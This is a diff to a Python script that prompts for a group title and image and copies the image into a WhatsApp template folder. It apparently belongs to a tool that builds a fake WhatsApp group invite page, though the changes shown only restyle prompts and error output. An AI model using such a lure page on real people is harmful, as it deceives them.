@@ -4,22 +4,20 @@ import os
 import shutil
 import quo
 
-R = '\033[31m' # red
-G = '\033[32m' # green
-C = '\033[36m' # cyan
-W = '\033[0m'  # white
 
-
-quo.echo(f"[>>]", fg="vyellow", bold=True, nl=False, italic=True)
+quo.echo(f"[>>]", fg="vyellow", bold=True, nl=False)
 quo.echo(" Group Title", fg="vcyan", nl=False)
 title = quo.prompt("")
-image = input(G + '[+]' + C + ' Path to Group Img (Best Size : 300x300): ' + W)
+quo.echo(f"[>>]", fg="vyellow", bold=True, nl=False)
+quo.echo(f" Path to Group Image", fg="vcyan", nl=False)
+quo.echo(f" (Ideal image size is 300x300)", fg="vred", nl=False)
+image = quo.prompt("")
 
 img_name = image.split('/')[-1]
 try:
     shutil.copyfile(image, 'template/whatsapp/images/{}'.format(img_name))
 except Exception as e:
-    print('\n' + R + '[-]' + C + ' Exception : ' + W + str(e))
+    print('\n' + '[-]' + ' Exception : ' + str(e))
     exit()
 
 with open('template/whatsapp/index_temp.html', 'r') as index_temp:
